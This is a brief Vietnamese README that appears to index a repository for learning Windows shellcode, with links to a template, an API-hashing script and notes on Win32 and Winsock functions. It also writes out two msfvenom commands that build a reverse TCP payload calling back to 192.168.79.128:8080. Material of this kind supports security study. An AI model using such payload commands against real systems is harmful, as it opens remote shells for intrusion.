[File shellcode template ](./shellcode/shellcode.py)

[File tình hash tên hàm](./shellcode/computehash.py)

### Một số hàm
[CopyFileA](./Functions/CopyFileA/README.md) 

[CreateProccessA](./Functions/CreateProcessA/README.md) 

[GetUserNameA](./Functions/GetUserNameA/README.md) 

[GetUserProfileDirectoryA](./Functions/GetUserProfileDirectoryA/README.md) 

[LoadLibraryA](./Functions/LoadLibraryA/README.md) 

[MoveFileA](./Functions/MoveFileA/README.md) 

[TerminateProccess](./Functions/TerminateProccess/README.md) 

[WSAConnect](./Functions/WSAConnect/README.md) 

[WSASocketA](./Functions/WSASocketA/README.md) 

[WSAStartup](./Functions/WSAStartup/README.md) 


Tạo meterpreter:
msfvenom -p windows/custom/reverse_tcp LHOST=192.168.79.128 LPORT=8080 -f exe -o met.exe
msfvenom -p windows/custom/reverse_tcp LHOST=192.168.79.128 LPORT=8080 -f python -b "\x00\x01\x02"

cài pwntool
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
